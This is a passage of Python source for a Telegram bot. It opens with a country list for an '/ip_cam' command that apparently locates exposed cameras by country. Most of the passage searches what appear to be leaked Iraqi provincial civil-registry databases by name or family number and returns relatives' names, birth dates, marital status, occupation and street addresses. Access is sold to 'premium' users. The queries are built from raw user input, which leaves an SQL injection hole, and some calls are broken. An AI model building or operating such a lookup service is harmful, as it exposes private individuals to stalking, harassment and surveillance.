• BE --> Belgium
• VN --> Viet Nam
• BR --> Brazil
• TR --> Turkey
• IN --> India
• - --> -
• SK --> Slovakia
• IE --> Ireland
• ID --> Indonesia
• ZA --> South Africa
• RS --> Serbia
• TH --> Thailand
• FI --> Finland
• HU --> Hungary
• UA --> Ukraine
• GR --> Greece
• IL --> Israel
• AU --> Australia
• LV --> Latvia
• BD --> Bangladesh
• AR --> Argentina
• EE --> Estonia
• MX --> Mexico
• SY --> Syria
• LT --> Lithuania
• BA --> Bosnia And Herzegovina
• IS --> Iceland
• CO --> Colombia
• NZ --> New Zealand
• SI --> Slovenia
• HK --> Hong Kong
• CL --> Chile
• CN --> China
• MD --> Moldova, Republic Of
• SG --> Singapore
• BY --> Belarus
• MY --> Malaysia
• PT --> Portugal
• EC --> Ecuador
• AM --> Armenia
• KZ --> Kazakhstan
• LU --> Luxembourg
• MT --> Malta
• NI --> Nicaragua
• HR --> Croatia
• ME --> Montenegro
• FO --> Faroe Islands
• TN --> Tunisia
• CR --> Costa Rica
• SA --> Saudi Arabia
• PA --> Panama
• NG --> Nigeria
• MK --> Macedonia
• KH --> Cambodia
• MO --> Macao
• GP --> Guadeloupe
• HN --> Honduras
• KY --> Cayman Islands
• AD --> Andorra
• DZ --> Algeria
• PE --> Peru
• BB --> Barbados
• KN --> Saint Kitts And Nevis
• GU --> Guam
• GG --> Guernsey
• PY --> Paraguay
• TT --> Trinidad And Tobago
• LA --> Laos
• PR --> Puerto Rico
• TZ --> Tanzania
• MG --> Madagascar
• GE --> Georgia
• RE --> Reunion
• NC --> New Caledonia
• AW --> ArubaA 

• For Use write  :
/ip_cam  contry code
                        ''')

@bot.message_handler(commands=['ip_cam'])
def ip_cam(message):
    if str(message.chat.id) in allusers:
        try:
            num=message.text
            co=num.split('/ip_cam ')[1]
            co=co.upper()
            try:
                cam(message,co)
            except:
                bot.reply_to(message,f'''
• send contry like this :
/ip_cam SA ''')
        except:
                bot.reply_to(message,f'''
• send contry like this :
/ip_cam SA''')
    else:
            bot.reply_to(message,f'''
• Your ID --> '''+message.chat.id+'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali''')
            for i in admin :
                bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            ''')



def baghdad(name1,dbname,message):
    if str(message.chat.id) in VIP_PREM : 

        db=sqlite3.connect(dbname)
        cr = db.cursor()
        man=many[0]
        if 0 in many:
            hash=''
        elif 1 in many:
            hash=''
        elif 2 in many:
            hash=''
        elif 3 in many:
            hash=''
        elif 4 in many:
            hash=''
        elif 5 in many:
            hash=''
        cr.execute(f"select * from person where p_first = '{name1.split(' ')[0]+hash}'")

        response = cr.fetchall()
        if response == []:
            if man < 5:
                pass
                man=many[0]+1
                many.clear()
                many.append(man)
                baghdad(name1,dbname)
        else:
            for i in response:
                i=str(i)
                name2=(i.split(',')[3])
                name=name2.split('\\')[0]
                f_name=name.split("'")[1]


                g_name1=(i.split(',')[4])
                g_name=g_name1.split('\\')[0]
                g_name=g_name.split("'")[1]


                ff_name=name1.split(' ')[0]


                if f_name == name1.split(' ')[1]:
                    name=str(ff_name+' '+f_name+' '+g_name)
                    if g_name == name1.split(' ')[2]:
                        name=name
                        p_birth=i.split(',')[6]
                        birth=str(p_birth).split('00.')[0]
                        mother=str(i).split(',')[8]
                        gr_mother=str(i).split(',')[9]
                        loc=str(i).split(',')[11]
                        family=str(i).split(',')[1]
                        zgzg=str(i).split(',')[13]
                        bot.send_message(message.chat.id,f'''
• hes name -->> {ff_name}
• father name -->> {f_name}
• grand father name -->> {g_name}
• birth day -->> {birth}
• mother name -->> {mother}
• grand mother name -->> {gr_mother}
• family number -->> {family}
• Area address -->> {loc}
• street -->> {zgzg}
• from -->> {dbname.split('.')[0]}

                        ''')
            many.clear()
            many.append(0)
            db.commit()
            db.close()
    else:
        bot.reply_to(message,'''
• For use this feature you must be a premium user
• To sign up as a premium user, contact to :
@Eng_Hamzah_Ali
                                    ''')
def erbil(name1,dbname,message):
    if str(message.chat.id) in VIP_PREM : 
        db=sqlite3.connect(dbname)
        cr = db.cursor()
        man=many[0]
        if 0 in many:
            hash=''
        elif 1 in many:
            hash=''
        elif 2 in many:
            hash=''
        elif 3 in many:
            hash=''
        elif 4 in many:
            hash=''
        elif 5 in many:
            hash=''
        cr.execute(f"select * from person where p_first = '{name1.split(' ')[0]+hash}'")

        response = cr.fetchall()
        if response == []:
            if man < 5:
                pass
                man=many[0]+1
                many.clear()
                many.append(man)
                erbil(name1,dbname)
        else:
            for i in response:
                i=str(i)
                name2=(i.split(',')[4])
                name=name2.split('\\')[0]

                g_name1=(i.split(',')[5])
                g_name=g_name1.split('\\')[0]

                f_name=name.split("'")[1]
                g_name=g_name.split("'")[1]
                ff_name=name1.split(' ')[0]

                if f_name == name1.split(' ')[1]:
                    name=str(ff_name+' '+f_name+' '+g_name)
                    if g_name == name1.split(' ')[2]:
                        name=name
                        p_birth=i.split(',')[7]
                        birth=str(p_birth).split('00.')[0]
                        work=str(i).split(',')[16]
                        mother=str(i).split(',')[17]
                        try:
                            mother=mother.split('\\')[0]
                        except:
                            pass
                        gr_mother=str(i).split(',')[18]
                        try:
                            gr_mother=gr_mother.split('\\')[0]
                        except:
                             pass
                        type=str(i).split(',')[20]
                        loc=str(i).split(',')[21]
                        family=str(i).split(',')[1]
                        zgzg=str(i).split(',')[8]
                        bot.send_message(message.chat.id,f'''
• hes name -->> {ff_name}
• father name -->> {f_name}
• grand father name -->> {g_name}
• birth day -->> {birth}
• work -->> {work}
• mother name -->> {mother}
• grand mother name -->> {gr_mother}
• marital status -->> {type}
• family number -->> {family}
• Area address -->> {loc}
• street -->> {zgzg}
• from -->> {dbname.split('.')[0]}

for search of the family send:
/fam {family.split("'")[1]} , {dbname}
                        ''')
            many.clear()
            many.append(0)
            db.commit()
            db.close()
    else:
        bot.reply_to(message,'''
• For use this feature you must be a premium user
• To sign up as a premium user, contact to :
@Eng_Hamzah_Ali
                                    ''')























def erbil_FA(name1,dbname,message):
    if str(message.chat.id) in VIP_PREM : 
        db=sqlite3.connect(dbname)
        cr = db.cursor()
        man=many[0]
        if 0 in many:
            hash=''
        elif 1 in many:
            hash=''
        elif 2 in many:
            hash=''
        elif 3 in many:
            hash=''
        elif 4 in many:
            hash=''
        elif 5 in many:
            hash=''
        cr.execute(f"select * from person where p_first = '{name1.split(' ')[0]+hash}'")

        response = cr.fetchall()
        if response == []:
            if man < 5:
                pass
                man=many[0]+1
                many.clear()
                many.append(man)
                erbil(name1,dbname)
        else:
            for i in response:
                i=str(i)
                name2=(i.split(',')[4])
                name=name2.split('\\')[0]

                g_name1=(i.split(',')[5])
                g_name=g_name1.split('\\')[0]

                f_name=name.split("'")[1]
                g_name=g_name.split("'")[1]
                ff_name=name1.split(' ')[0]

                if f_name == name1.split(' ')[1]:
                    name=str(ff_name+' '+f_name+' '+g_name)
                    p_birth=i.split(',')[7]
                    birth=str(p_birth).split('00.')[0]
                    work=str(i).split(',')[16]
                    mother=str(i).split(',')[17]
                    try:
                        mother=mother.split('\\')[0]
                    except:
                        pass
                    gr_mother=str(i).split(',')[18]
                    try:
                        gr_mother=gr_mother.split('\\')[0]
                    except:
                            pass
                    type=str(i).split(',')[20]
                    loc=str(i).split(',')[21]
                    family=str(i).split(',')[1]
                    zgzg=str(i).split(',')[8]
                    bot.send_message(message.chat.id,f'''
• hes name -->> {ff_name}
• father name -->> {f_name}
• grand father name -->> {g_name}
• birth day -->> {birth}
• work -->> {work}
• mother name -->> {mother}
• grand mother name -->> {gr_mother}
• marital status -->> {type}
• family number -->> {family}
• Area address -->> {loc}
• street -->> {zgzg}
• from -->> {dbname.split('.')[0]}

for search of the family send:
/fam {family.split("'")[1]} , {dbname}
                        ''')
            many.clear()
            many.append(0)
            db.commit()
            db.close()
    else:
        bot.reply_to(message,'''
• For use this feature you must be a premium user
• To sign up as a premium user, contact to :
@Eng_Hamzah_Ali
                                    ''')


















def fam(f_code,dbname,message):
    if str(message.chat.id) in VIP_PREM : 
        db=sqlite3.connect(dbname)
        cr = db.cursor()
        cr.execute(f"select * from person where fam_no = '{f_code}'")
        response = cr.fetchall()
        if response == []:
             bot.send_message(message.chat.id,'• We dont fond the family code')
        else:
            for i in response:
                i=str(i)
                name2=(i.split(',')[4])
                name=name2.split('\\')[0]
                fname2=(i.split(',')[3])
                fname=fname2.split('\\')[0]
                g_name1=(i.split(',')[5])
                g_name=g_name1.split('\\')[0]
                f_name=name.split("'")[1]
                g_name=g_name.split("'")[1]
                fname=fname.split("'")[1]
                name=str(fname+' '+f_name+' '+g_name)
                p_birth=i.split(',')[7]
                birth=str(p_birth).split('00.')[0]
                work=str(i).split(',')[16]
                mother=str(i).split(',')[17]
                gr_mother=str(i).split(',')[18]
                type=str(i).split(',')[20]
                loc=str(i).split(',')[21]
                family=str(i).split(',')[1]
                zgzg=str(i).split(',')[8]
                family=family.split("'")[0]
                bot.send_message(message.chat.id,f'''
• hes name -->> {fname}
• father name -->> {f_name}
• grand father name -->> {g_name}
• birth day -->> {birth}
• work -->> {work}
• mother name -->> {mother}
• grand mother name -->> {gr_mother}
• marital status -->> {type}
• family number -->> {family}
• Area address -->> {loc}
• street -->> {zgzg}
• from -->> {dbname}

                        ''')
            bot.send_message(message.chat.id,f'• Done')
            many.clear()
            many.append(0)
            db.commit()
            db.close()
    else:
        bot.reply_to(message,'''
• For use this feature you must be a premium user
• To sign up as a premium user, contact to :
@Eng_Hamzah_Ali
                                    ''')
        
@bot.message_handler(commands=['fam'])
def FAM(message):
        num=message.text
        f_code=num.split('/fam ')[1]
        dbname=f_code.split(',')[1]
        dbname=dbname.split(' ')[1]

        f_code=f_code.split(',')[0]
        f_code=f_code.split(' ')[0]
        print(f_code)
        print(dbname)
        fam(f_code,dbname,message)

        
@bot.message_handler(commands=['N_iraq'])
def N_iraq(message):
    if str(message.chat.id) in VIP_PREM:
        try:
            num=message.text
            name1=num.split('/N_iraq ')[1]
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'diyala.db',message)
                except:
                     erbil_FA(name1,'diyala.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in diyala datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'duhok.db',message)
                except:
                     erbil_FA(name1,'duhok.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in duhok datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'babylon.db',message)
                except:
                     erbil_FA(name1,'babylon.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in babylon datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'kirkuk.db',message)
                except:
                     erbil_FA(name1,'kirkuk.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in kirkuk datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'basrah.db',message)
                except:
                     erbil_FA(name1,'basrah.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in basrah datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'dhiqar.db',message)
                except:
                     erbil_FA(name1,'dhiqar.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in dhiqar datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'muthana.db',message)
                except:
                     erbil_FA(name1,'muthana.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in muthana datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'nineveh.db',message)
                except:
                     erbil_FA(name1,'nineveh.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in nineveh datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'najaf.db',message)
                except:
                     erbil_FA(name1,'najaf.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in najaf datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'mesan.db',message)
                except:
                     erbil_FA(name1,'mesan.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in mesan datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'qadisiya.db',message)
                except:
                     erbil_FA(name1,'qadisiya.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in qadisiya datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'salahaldeen.db',message)
                except:
                     erbil_FA(name1,'salahaldeen.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in salahaldeen datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'wasit.db',message)
                except:
                     erbil_FA(name1,'wasit.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in wasit datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'karbalaa.db',message)
                except:
                     erbil_FA(name1,'karbalaa.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in karbalaa datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'baghdad.db',message)
                except:
                     erbil_FA(name1,'baghdad.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in baghdad datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'erbil.db',message)
                except:
                     erbil_FA(name1,'erbil.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in erbil datebase')
            try:
                try:
                     name1.split(' ')[2]
                     erbil(name1,'a.db',message)
                except:
                     erbil_FA(name1,'a.db',message)
            except:
                bot.send_message(message.chat.id,'we dont foun '+name1+' in balad datebase')
        except:
                bot.reply_to(message,f'''
• send name like this :
/N_iraq name''')
    else:
        bot.reply_to(message,'''
• For use this feature you must be a premium user
• To sign up as a premium user, contact to :
@Eng_Hamzah_Ali
                                    ''')    




print('[+] Bot - Done ')
bot.infinity_polling()
